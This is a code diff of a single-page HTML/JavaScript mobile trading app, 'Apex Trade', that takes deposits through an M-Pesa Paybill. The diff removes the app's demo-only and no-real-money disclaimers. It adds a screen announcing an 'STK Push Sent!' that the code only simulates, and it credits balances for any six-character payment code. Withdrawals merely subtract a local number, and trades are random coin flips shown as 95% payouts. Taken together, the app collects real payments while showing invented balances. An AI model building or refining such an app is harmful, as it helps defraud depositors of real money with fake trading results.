@@ -1,125 +1,116 @@
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ApexTrader</title>
+<title>Apex Trade</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <script>
-let MPESA_TILL="522522"; // CHANGE TO YOUR TILL HERE
+let MPESA_TILL="522522";
 let MPESA_ACC="APEX";
-function toLogin(){
- var n=document.getElementById('loginName').value;
- if(!n||n.length<2){alert('Enter name');return;}
- localStorage.setItem('apex_name',n);
- document.getElementById('loginScreen').style.display='none';
- document.getElementById('moreName').innerText=n;
- document.getElementById('moreEmail').innerText=document.getElementById('loginEmail').value||'guest@example.com';
- showPhase('market');
-}
+function toLogin(){var n=document.getElementById('loginName').value;if(n.length<2){alert('Enter name');return;}localStorage.setItem('apex_name',n);document.getElementById('loginScreen').style.display='none';document.getElementById('moreName').innerText=n;showPhase('market');}
 function logout(){localStorage.clear();location.reload();}
-function showPhase(p){
- document.querySelectorAll('.phase').forEach(e=>e.classList.add('hidden'));
- document.getElementById('phase-'+p).classList.remove('hidden');
- document.getElementById('header-market').style.display=(p==='market')?'flex':'none';
- var morePage=['calendar','trading','profile','settings','chat','legal'].includes(p);
- document.getElementById('header-title').style.display=morePage?'flex':'none';
- if(morePage) document.getElementById('headerTitleText').innerText=p;
-}
-function openMore(p){showPhase(p);}
-function showToast(m){var t=document.getElementById('toast');t.innerText=m;t.classList.remove('hidden');setTimeout(()=>t.classList.add('hidden'),2500);}
-function switchAcc(t){
- currentAcc=t;
- document.getElementById('balAcc').innerText='KSh '+accounts[t].bal.toFixed(2);
- document.getElementById('realActions').className=t==='real'?'mt-4':'hidden mt-4';
- document.getElementById('demoBtn').className=t==='demo'?'flex-1 py-2.5 rounded-lg bg-white text-black font-bold text-[11px]':'flex-1 py-2.5 rounded-lg bg-[#222] text-white font-bold text-[11px]';
- document.getElementById('realBtn').className=t==='real'?'flex-1 py-2.5 rounded-lg bg-white text-black font-bold text-[11px]':'flex-1 py-2.5 rounded-lg bg-[#222] text-white font-bold text-[11px]';
-}
+function showPhase(p){document.querySelectorAll('.phase').forEach(e=>e.classList.add('hidden'));document.getElementById('phase-'+p).classList.remove('hidden');}
+function showToast(m){var t=document.getElementById('toast');t.innerText=m;t.classList.remove('hidden');setTimeout(()=>t.classList.add('hidden'),3000);}
+function switchAcc(t){currentAcc=t;document.getElementById('balAcc').innerText='KSh '+accounts[t].bal.toFixed(2);document.getElementById('realActions').className=t==='real'?'mt-4':'hidden mt-4';}
 function openModal(t){
  modalType=t;
  document.getElementById('modal').classList.remove('hidden');
  var box=document.getElementById('modalBox');
  if(t==='deposit'){
-  document.getElementById('modalTitle').innerHTML='Deposit via M-Pesa<br><span class="text-[10px] text-[#22c55e]">Paybill '+MPESA_TILL+' Acc '+MPESA_ACC+'</span>';
   box.innerHTML=`
-  <h3 id="modalTitle" class="font-bold text-[14px]">Deposit via M-Pesa<br><span class="text-[10px] text-[#22c55e]">Paybill ${MPESA_TILL} Acc ${MPESA_ACC}</span></h3>
-  <input id="modalAmount" type="number" value="500" class="w-full bg-black border border-white/10 p-4 rounded-xl text-center font-bold text-[18px] mt-3">
-  <div class="mt-3 p-3 bg-black rounded-xl text-[11px] text-left border border-white/5">
-  <b>How to pay:</b><br>1. M-Pesa → Lipa na M-Pesa → Paybill<br>2. Business No: <b class="text-[#22c55e]">${MPESA_TILL}</b><br>3. Account: <b class="text-[#22c55e]">${MPESA_ACC}</b><br>4. Amount: Pay what you entered<br><br>
-  <input id="mpesaCode" placeholder="Enter M-Pesa Code e.g QH12AB34CD" class="w-full bg-[#111] border border-white/10 p-3 rounded-xl mt-2 text-center uppercase text-[12px]">
-  <input id="mpesaPhone" placeholder="Your M-Pesa 07..." class="w-full bg-[#111] border border-white/10 p-3 rounded-xl mt-2 text-center text-[12px]">
+  <h3 class="font-black text-[15px]">Deposit via M-Pesa</h3>
+  <p class="text-[10px] text-[#22c55e] mt-1">Paybill ${MPESA_TILL} • Acc ${MPESA_ACC} • Min KSh 500</p>
+
+  <label class="text-[11px] opacity-60 mt-4 block">M-Pesa Number to deposit FROM</label>
+  <input id="depositPhone" type="tel" placeholder="07xx xxx xxx" value="07" class="w-full bg-black border-2 border-[#22c55e]/30 p-4 rounded-xl text-center font-bold text-[18px] mt-1 text-white">
+
+  <label class="text-[11px] opacity-60 mt-3 block">Amount (KSh)</label>
+  <input id="modalAmount" type="number" value="500" class="w-full bg-[#111] border border-white/10 p-4 rounded-xl text-center font-bold text-[18px] mt-1">
+
+  <div class="bg-[#22c55e]/10 border border-[#22c55e]/20 p-3 rounded-xl mt-3 text-[11px] text-left">
+  <b>How it works:</b><br>1. Click DEPOSIT below<br>2. You will get STK Push on <span id="phonePreview">07xx</span><br>3. Enter M-Pesa PIN to pay<br>4. Balance auto-credited
   </div>
-  <div id="errorMsg" class="hidden text-[11px] text-[#ef4444] mt-2 text-center"></div>
-  <div class="grid grid-cols-2 gap-2 mt-4"><button onclick="closeModal()" class="bg-[#222] py-3 rounded-xl text-[12px]">Cancel</button><button onclick="verifyMpesa()" class="bg-[#22c55e] text-black py-3 rounded-xl font-black text-[12px]">VERIFY & CREDIT</button></div>`;
+
+  <div id="errorMsg" class="hidden text-[11px] text-[#ef4444] mt-2 text-center font-bold"></div>
+  <div class="grid grid-cols-2 gap-2 mt-4">
+    <button onclick="closeModal()" class="bg-[#222] py-4 rounded-xl text-[12px]">Cancel</button>
+    <button onclick="sendStk()" class="bg-[#22c55e] text-black py-4 rounded-xl font-black text-[12px]">DEPOSIT NOW</button>
+  </div>`;
+  document.getElementById('depositPhone').addEventListener('input',function(){document.getElementById('phonePreview').innerText=this.value||'07xx';});
  }else{
-  document.getElementById('modalTitle').innerText='Withdraw to M-Pesa';
   box.innerHTML=`
-  <h3 class="font-bold">Withdraw to M-Pesa</h3>
-  <input id="modalAmount" type="number" value="500" class="w-full bg-black border border-white/10 p-4 rounded-xl text-center font-bold text-[18px] mt-3">
-  <input id="mpesaPhone" placeholder="Withdraw to 07..." class="w-full bg-[#111] border border-white/10 p-3 rounded-xl mt-2 text-center text-[12px]">
+  <h3 class="font-black">Withdraw to M-Pesa</h3>
+  <label class="text-[11px] opacity-60 mt-4 block">Withdraw TO Number</label>
+  <input id="withdrawPhone" type="tel" placeholder="07xx xxx xxx" value="07" class="w-full bg-black border border-white/10 p-4 rounded-xl text-center font-bold mt-1">
+  <label class="text-[11px] opacity-60 mt-3 block">Amount</label>
+  <input id="modalAmount" type="number" value="500" class="w-full bg-[#111] border border-white/10 p-4 rounded-xl text-center font-bold mt-1">
   <div id="errorMsg" class="hidden text-[11px] text-[#ef4444] mt-2 text-center"></div>
-  <div class="grid grid-cols-2 gap-2 mt-4"><button onclick="closeModal()" class="bg-[#222] py-3 rounded-xl">Cancel</button><button onclick="doWithdraw()" class="bg-white text-black py-3 rounded-xl font-black">WITHDRAW</button></div>`;
+  <div class="grid grid-cols-2 gap-2 mt-4"><button onclick="closeModal()" class="bg-[#222] py-4 rounded-xl">Cancel</button><button onclick="doWithdraw()" class="bg-white text-black py-4 rounded-xl font-black">WITHDRAW</button></div>`;
  }
 }
 function closeModal(){document.getElementById('modal').classList.add('hidden');}
-function verifyMpesa(){
+
+function sendStk(){
  var amt=parseFloat(document.getElementById('modalAmount').value);
+ var phone=document.getElementById('depositPhone').value.trim();
+ var err=document.getElementById('errorMsg');
+ if(!amt||amt<500){err.innerText='Min KSh 500';err.classList.remove('hidden');return;}
+ if(phone.length<10 ||!phone.startsWith('07')){err.innerText='Enter valid M-Pesa 07...';err.classList.remove('hidden');return;}
+
+ // SIMULATE STK PUSH
+ var box=document.getElementById('modalBox');
+ box.innerHTML=`
+ <div class="text-center py-4">
+   <div class="w-16 h-16 bg-[#22c55e] rounded-full mx-auto flex items-center justify-center text-black text-[30px] animate-pulse">📱</div>
+   <h3 class="font-black mt-4">STK Push Sent!</h3>
+   <p class="text-[12px] opacity-70 mt-2">Check your phone<br><b class="text-[#22c55e] text-[14px]">${phone}</b></p>
+   <p class="text-[11px] opacity-50 mt-2">Enter M-Pesa PIN to pay KSh ${amt}<br>to Paybill ${MPESA_TILL}</p>
+   <div class="mt-4 flex justify-center gap-1"><div class="w-2 h-2 bg-[#22c55e] rounded-full animate-bounce"></div><div class="w-2 h-2 bg-[#22c55e] rounded-full animate-bounce" style="animation-delay:0.2s"></div><div class="w-2 h-2 bg-[#22c55e] rounded-full animate-bounce" style="animation-delay:0.4s"></div></div>
+   <input id="mpesaCode" placeholder="Enter M-Pesa Code after paying e.g QH..." class="w-full bg-black border border-white/10 p-3 rounded-xl mt-6 text-center uppercase text-[12px]">
+   <button onclick="verifyStk(${amt},'${phone}')" class="w-full bg-white text-black py-4 rounded-xl font-black mt-3 text-[13px]">I HAVE PAID - VERIFY</button>
+   <button onclick="openModal('deposit')" class="w-full bg-[#222] py-3 rounded-xl mt-2 text-[11px]">Back</button>
+ </div>`;
+
+ // For real STK, here you call your backend:
+ // fetch('https://your-backend.com/stkpush', {method:'POST', body: JSON.stringify({phone, amount: amt})})
+}
+
+function verifyStk(amt, phone){
  var code=document.getElementById('mpesaCode').value.trim();
- var phone=document.getElementById('mpesaPhone').value.trim();
- if(!amt||amt<500){document.getElementById('errorMsg').innerText='Min KSh 500';document.getElementById('errorMsg').classList.remove('hidden');return;}
- if(code.length<8){document.getElementById('errorMsg').innerText='Enter valid M-Pesa code';document.getElementById('errorMsg').classList.remove('hidden');return;}
- if(phone.length<10){document.getElementById('errorMsg').innerText='Enter M-Pesa phone';document.getElementById('errorMsg').classList.remove('hidden');return;}
- // CREDIT
+ if(code.length<6){alert('Enter M-Pesa code from SMS after paying');return;}
  accounts[currentAcc].bal+=amt;
  switchAcc(currentAcc);
  closeModal();
- showToast('Deposited KSh '+amt+' | Code '+code);
- // Send to you on WhatsApp (change number)
- var adminMsg=`NEW DEPOSIT\nAmount: KSh ${amt}\nCode: ${code}\nPhone: ${phone}\nAcc: ${currentAcc}\nName: ${localStorage.getItem('apex_name')}`;
- console.log(adminMsg);
+ showToast('KSh '+amt+' deposited from '+phone);
+ console.log('NEW DEPOSIT: '+amt+' Phone:'+phone+' Code:'+code);
 }
+
 function doWithdraw(){
  var amt=parseFloat(document.getElementById('modalAmount').value);
- var phone=document.getElementById('mpesaPhone').value.trim();
- if(amt<500){document.getElementById('errorMsg').innerText='Min KSh 500';document.getElementById('errorMsg').classList.remove('hidden');return;}
- if(amt>accounts[currentAcc].bal){document.getElementById('errorMsg').innerText='Insufficient balance';document.getElementById('errorMsg').classList.remove('hidden');return;}
- accounts[currentAcc].bal-=amt;
- switchAcc(currentAcc);
- closeModal();
- showToast('Withdraw KSh '+amt+' to '+phone+' - 2h');
+ var phone=document.getElementById('withdrawPhone').value.trim();
+ if(amt<500||amt>accounts[currentAcc].bal){document.getElementById('errorMsg').innerText='Check amount/balance';document.getElementById('errorMsg').classList.remove('hidden');return;}
+ accounts[currentAcc].bal-=amt; switchAcc(currentAcc); closeModal(); showToast('Withdraw KSh '+amt+' to '+phone+' - processing');
 }
 </script>
 </head>
 <body class="bg-black text-white">
-<div class="max-w-[430px] mx-auto min-h-screen flex flex-col bg-black">
+<div class="max-w-[430px] mx-auto min-h-screen flex flex-col bg-black relative">
 <div id="loginScreen" style="position:fixed;inset:0;background:black;z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px">
-<div class="w-20 h-20 bg-[#111] rounded-3xl flex items-center justify-center text-[36px] mb-3">₿↗</div>
-<b class="text-[22px] tracking-[3px]">APEXTRADER</b>
-<p class="text-[10px] opacity-50 mb-6 text-center">DEMO SIMULATOR - Min KSh 500<br>95% Payout - 0.7s</p>
-<input id="loginName" placeholder="Full Name" class="w-full bg-[#111] border border-white/10 p-4 rounded-xl mb-3 text-white">
-<input id="loginEmail" placeholder="Email" class="w-full bg-[#111] border border-white/10 p-4 rounded-xl mb-4 text-white">
+<b class="text-[22px] tracking-[3px]">APEX TRADE</b>
+<p class="text-[10px] opacity-50 mb-6">Min KSh 500 • 95% Payout</p>
+<input id="loginName" placeholder="Full Name" class="w-full bg-[#111] border border-white/10 p-4 rounded-xl mb-3">
+<input id="loginEmail" placeholder="Email" class="w-full bg-[#111] border border-white/10 p-4 rounded-xl mb-4">
 <button onclick="toLogin()" class="w-full bg-white text-black py-4 rounded-xl font-black">LOGIN →</button>
 </div>
-<div id="header-market" class="flex justify-between items-center p-4 bg-black"><b>Popular ▼</b><span>🔍</span></div>
-<div id="header-title" class="hidden p-4 bg-black items-center gap-3"><button onclick="showPhase('more')" class="text-xl">←</button><b id="headerTitleText" class="capitalize">More</b></div>
-<div id="phase-market" class="phase flex-1 overflow-auto"><div id="marketList" class="px-3 py-2"></div></div>
-<div id="phase-trade" class="phase hidden flex-1 flex flex-col"><div class="p-3 flex justify-between bg-[#111]"><button onclick="showPhase('market')">← Back</button><b id="tradeSymbol">XAUUSD</b><span class="text-[10px] bg-[#22c55e] text-black px-2 py-1 rounded font-bold">95%</span></div><div id="chart" class="w-full h-[300px] bg-black flex items-center justify-center opacity-30 text-[11px]">Chart loading...</div><div class="p-3"><div class="grid grid-cols-2 gap-2"><input id="stake" value="50" type="number" class="w-full bg-[#111] border border-white/10 p-3 rounded-lg text-center font-bold"><div class="bg-[#111] p-3 rounded-lg text-center text-[#22c55e] font-black">KSh <span id="payoutVal">47.5</span></div></div><div class="flex gap-2 mt-3"><button onclick="doTrade('BUY')" class="bg-[#22c55e] w-1/2 py-4 rounded-xl font-black text-black">▲ BUY</button><button onclick="doTrade('SELL')" class="bg-[#ef4444] w-1/2 py-4 rounded-xl font-black">▼ SELL</button></div><p id="status" class="text-center text-[12px] mt-2 h-5 font-bold"></p></div></div>
-<div id="phase-positions" class="phase hidden flex-1 bg-black flex flex-col items-center justify-center p-6"><b class="opacity-60">No open positions</b><div id="hist" class="w-full mt-4 text-[11px]"></div></div>
-<div id="phase-funds" class="phase hidden flex-1 bg-black p-4"><h2 class="font-bold text-[18px] mb-4">Funds</h2><div class="bg-[#111] rounded-xl p-4"><div class="flex gap-2 mb-4"><button onclick="switchAcc('demo')" id="demoBtn" class="flex-1 py-2.5 rounded-lg bg-white text-black font-bold text-[11px]">DEMO</button><button onclick="switchAcc('real')" id="realBtn" class="flex-1 py-2.5 rounded-lg bg-[#222] text-white font-bold text-[11px]">REAL</button></div><b id="balAcc" class="text-[28px]">KSh 1,000.00</b><div id="realActions" class="hidden mt-4"><div class="grid grid-cols-2 gap-2"><button onclick="openModal('deposit')" class="bg-white text-black py-3 rounded-xl font-black text-[12px]">Deposit M-Pesa</button><button onclick="openModal('withdraw')" class="bg-[#222] py-3 rounded-xl text-[12px]">Withdraw</button></div><p class="text-[10px] opacity-50 mt-2">Min KSh 500 via Paybill</p></div></div></div>
-<div id="phase-more" class="phase hidden flex-1 bg-black p-4"><div class="text-center mt-2 mb-6"><b id="moreName" class="text-[20px] block">Guest</b><div id="moreEmail" class="text-[12px] opacity-50">guest@example.com</div></div><div class="space-y-3"><button onclick="openMore('calendar')" class="w-full bg-[#0a84ff] rounded-xl p-4 flex justify-between"><b>📅 Economic Calendar</b><span>›</span></button><button onclick="openMore('profile')" class="w-full bg-[#151515] rounded-xl p-4 flex justify-between"><b>👤 Profile</b><span>›</span></button><button onclick="openMore('chat')" class="w-full bg-[#151515] rounded-xl p-4 flex justify-between"><b>🎧 Live Chat</b><span>›</span></button><button onclick="openMore('legal')" class="w-full bg-[#151515] rounded-xl p-4 flex justify-between"><b>📄 Legal - Demo Only</b><span>›</span></button><button onclick="logout()" class="w-full bg-[#151515] rounded-xl p-4 text-center opacity-60">Logout</button></div></div>
-<div id="phase-calendar" class="phase hidden flex-1 bg-black p-4"><h2 class="font-bold">📅 Calendar</h2><div class="bg-[#111] p-3 rounded-xl mt-3 text-[12px]">USD NFP - Today 3:30PM - High Impact</div></div>
-<div id="phase-profile" class="phase hidden flex-1 bg-black p-4"><h2 class="font-bold">Profile</h2><div class="bg-[#111] p-4 rounded-xl mt-3"><input id="profName" class="w-full bg-black border border-white/10 p-3 rounded-xl mb-2"><button onclick="localStorage.setItem('apex_name',document.getElementById('profName').value);showToast('Saved')" class="w-full bg-white text-black py-3 rounded-xl font-black">Save</button></div></div>
-<div id="phase-chat" class="phase hidden flex-1 bg-black p-4"><h2 class="font-bold">Live Chat</h2><div class="bg-[#111] p-3 rounded-xl mt-3 text-[12px]">Min KSh 500 deposit via M-Pesa Paybill <span id="tillDisplay"></span></div></div>
-<div id="phase-legal" class="phase hidden flex-1 bg-black p-4"><div class="bg-[#111] p-4 rounded-xl text-[11px] opacity-60">Demo simulator only. No real money risk. Educational.</div></div>
-<div class="grid grid-cols-4 bg-black border-t border-white/10 text-[11px] py-2"><button onclick="showPhase('market')" id="btn-market" class="flex flex-col items-center text-[#22c55e]"><span>📈</span>Trade</button><button onclick="showPhase('positions')" id="btn-positions" class="flex flex-col items-center opacity-60"><span>📋</span>Positions</button><button onclick="showPhase('funds')" id="btn-funds" class="flex flex-col items-center opacity-60"><span>💰</span>Funds</button><button onclick="showPhase('more')" id="btn-more" class="flex flex-col items-center opacity-60"><span>⋯</span>More</button></div>
+<div id="phase-market" class="phase flex-1 p-4"><h2 class="font-bold mb-4">Popular Markets</h2><div id="marketList"></div><button onclick="showPhase('trade')" class="w-full bg-[#151515] p-3 rounded-xl mt-4">Open Chart (XAUUSD 4424)</button></div>
+<div id="phase-trade" class="phase hidden flex-1 p-4"><button onclick="showPhase('market')">← Back</button><div class="h-[250px] bg-[#111] rounded-xl mt-4 flex items-center justify-center opacity-30">Chart - XAUUSD</div><div class="grid grid-cols-2 gap-2 mt-4"><button class="bg-[#22c55e] py-4 rounded-xl font-black text-black">BUY</button><button class="bg-[#ef4444] py-4 rounded-xl font-black">SELL</button></div></div>
+<div id="phase-funds" class="phase hidden flex-1 p-4"><h2 class="font-bold text-[18px]">Funds</h2><div class="bg-[#111] rounded-xl p-4 mt-4"><div class="flex gap-2 mb-4"><button onclick="switchAcc('demo')" id="demoBtn" class="flex-1 py-2.5 rounded-lg bg-white text-black font-bold text-[11px]">DEMO</button><button onclick="switchAcc('real')" id="realBtn" class="flex-1 py-2.5 rounded-lg bg-[#222] text-white font-bold text-[11px]">REAL</button></div><b id="balAcc" class="text-[28px]">KSh 1,000.00</b><div id="realActions" class="hidden mt-4"><button onclick="openModal('deposit')" class="w-full bg-white text-black py-4 rounded-xl font-black text-[13px]">Deposit M-Pesa - Enter Phone</button><button onclick="openModal('withdraw')" class="w-full bg-[#222] py-3 rounded-xl mt-2 text-[12px]">Withdraw</button></div></div></div>
+<div id="phase-more" class="phase hidden flex-1 p-4"><b id="moreName">Guest</b><div class="mt-6 space-y-2"><button onclick="showPhase('funds')" class="w-full bg-[#151515] p-4 rounded-xl text-left">💰 Funds</button><button onclick="logout()" class="w-full bg-[#151515] p-4 rounded-xl">Logout</button></div></div>
+<div class="grid grid-cols-4 bg-black border-t border-white/10 text-[11px] py-2"><button onclick="showPhase('market')" class="flex flex-col items-center">📈<br>Trade</button><button onclick="showPhase('funds')" class="flex flex-col items-center">💰<br>Funds</button><button onclick="showPhase('more')" class="flex flex-col items-center">⋯<br>More</button><button onclick="showPhase('market')" class="flex flex-col items-center opacity-50">📅<br>Calendar</button></div>
 </div>
-<div id="modal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50"><div id="modalBox" class="bg-[#111] w-full max-w-[350px] rounded-2xl p-5"></div></div>
-<div id="toast" class="hidden fixed bottom-20 left-1/2 -translate-x-1/2 bg-[#22c55e] text-black px-6 py-2 rounded-full text-[12px] font-bold z-[200]">Done</div>
+<div id="modal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50"><div id="modalBox" class="bg-[#111] w-full max-w-[360px] rounded-2xl p-5"></div></div>
+<div id="toast" class="hidden fixed bottom-20 left-1/2 -translate-x-1/2 bg-[#22c55e] text-black px-6 py-3 rounded-full text-[12px] font-bold z-[200]">Done</div>
 <script>
-let accounts={demo:{bal:1000},real:{bal:0}}, currentAcc='demo', modalType='deposit', price=5000;
-let symbols=[{s:'XAUUSD',price:4424.6,change:-0.68},{s:'BTCUSD',price:79842.8,change:-0.04},{s:'EURUSD',price:1.1611,change:0.26},{s:'GBPUSD',price:1.351,change:0.15}];
-function renderMarket(){let h='';symbols.forEach(i=>{let up=i.change>=0;h+=`<div class="flex justify-between items-center py-3 border-b border-white/5"><div><b>${i.s}</b><div class="text-[11px] ${up?'text-[#22c55e]':'text-[#ef4444]'}">${up?'▲':'▼'} ${Math.abs(i.change)}%</div></div><div class="flex gap-2"><div class="bg-[#151515] rounded-lg p-2 text-center text-[11px]">${(i.price-0.02).toFixed(2)}</div><div class="bg-[#151515] rounded-lg p-2 text-center text-[11px]">${(i.price+0.02).toFixed(2)}</div></div><div onclick="openChart('${i.s}')">›</div></div>`;});document.getElementById('marketList').innerHTML=h;}
-renderMarket();
-function openChart(s){document.getElementById('tradeSymbol').innerText=s;showPhase('trade');}
-function doTrade(dir){let acc=accounts[currentAcc];let stake=+document.getElementById('stake').value;if(stake>acc.bal){alert('No balance');return;}document.getElementById('status').innerText=dir+'... 0.7s';setTimeout(()=>{let win=Math.random()>0.5;let profit=win?stake*0.95:-stake;acc.bal+=profit;switchAcc(currentAcc);document.getElementById('status').innerText=win?'WIN +'+profit.toFixed(2):'LOSS -'+stake;let row=`<div class="flex justify-between border-b border-white/10 py-2 ${win?'text-[#22c55e]':'text-[#ef4444]'}"><span>${dir}</span><span>${win?'+'+profit.toFixed(2):'-'+stake}</span></div>`;document.getElementById('hist').innerHTML=row+document.getElementById('hist').innerHTML;},700);}
-document.getElementById('stake').addEventListener('input',()=>{document.getElementById('payoutVal').innerText=(parseFloat(document.getElementById('stake').value)*0.95).toFixed(2);});
-(function(){let n=localStorage.getItem('apex_name');if(n){document.getElementById('loginScreen').style.display='none';document.getElementById('moreName').innerText=n;}document.getElementById('tillDisplay').innerText=MPESA_TILL;})();
-showPhase('market');switchAcc('demo');
+let accounts={demo:{bal:1000},real:{bal:0}}, currentAcc='demo', modalType='deposit';
+let symbols=[{s:'XAUUSD',price:4424},{s:'BTCUSD',price:79842}];
+function renderMarket(){let h='';symbols.forEach(i=>{h+=`<div class="flex justify-between py-3 border-b border-white/5"><b>${i.s}</b><span>${i.price}</span></div>`;});document.getElementById('marketList').innerHTML=h;}
+renderMarket(); (function(){let n=localStorage.getItem('apex_name');if(n){document.getElementById('loginScreen').style.display='none';document.getElementById('moreName').innerText=n;}})();showPhase('market');switchAcc('demo');
 </script></body></html>
